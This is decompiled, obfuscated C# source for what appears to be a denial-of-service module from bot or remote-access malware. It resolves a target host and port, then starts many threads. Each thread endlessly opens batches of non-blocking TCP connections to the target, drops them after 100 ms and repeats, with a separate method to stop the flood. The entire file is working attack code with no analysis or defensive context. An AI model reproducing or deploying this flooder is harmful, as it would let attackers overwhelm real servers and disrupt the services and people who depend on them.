using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal class Class19
{
	private class Class20
	{
		private IPEndPoint ipendPoint_0;

		private Socket[] socket_0;

		private int int_0;

		public Class20(IPEndPoint ipendPoint_1, int int_1)
		{
			Class51.smethod_0();
			base._002Ector();
			ipendPoint_0 = ipendPoint_1;
			int_0 = int_1;
		}

		private void method_0(IAsyncResult iasyncResult_0)
		{
		}

		public void method_1()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						socket_0 = new Socket[int_0];
						for (int i = 0; i < int_0; i++)
						{
							socket_0[i] = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							socket_0[i].Blocking = false;
							AsyncCallback callback = method_0;
							socket_0[i].BeginConnect(ipendPoint_0, callback, socket_0[i]);
						}
						Thread.Sleep(100);
						for (int i = 0; i < int_0; i++)
						{
							if (socket_0[i].Connected)
							{
								socket_0[i].Disconnect(reuseSocket: false);
							}
							socket_0[i].Close();
							socket_0[i] = null;
						}
						socket_0 = null;
					}
				}
				catch
				{
					for (int i = 0; i < int_0; i++)
					{
						try
						{
							if (socket_0[i].Connected)
							{
								socket_0[i].Disconnect(reuseSocket: false);
							}
							socket_0[i].Close();
							socket_0[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	public static string string_0;

	private static IPEndPoint ipendPoint_0;

	public static ushort ushort_0;

	private static Class20[] class20_0;

	public static int int_0;

	public static int int_1;

	public static void smethod_0()
	{
		try
		{
			ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(string_0).AddressList[0], ushort_0);
		}
		catch
		{
			ipendPoint_0 = new IPEndPoint(IPAddress.Parse(string_0), ushort_0);
		}
		thread_0 = new Thread[int_1];
		threadStart_0 = new ThreadStart[int_1];
		class20_0 = new Class20[int_1];
		for (int i = 0; i < int_1; i++)
		{
			class20_0[i] = new Class20(ipendPoint_0, int_0);
			threadStart_0[i] = class20_0[i].method_1;
			thread_0[i] = new Thread(threadStart_0[i]);
			thread_0[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < int_1; i++)
		{
			try
			{
				thread_0[i].Abort();
				thread_0[i].Join();
			}
			catch
			{
			}
		}
	}

	public Class19()
	{
		Class51.smethod_0();
		base._002Ector();
	}
}
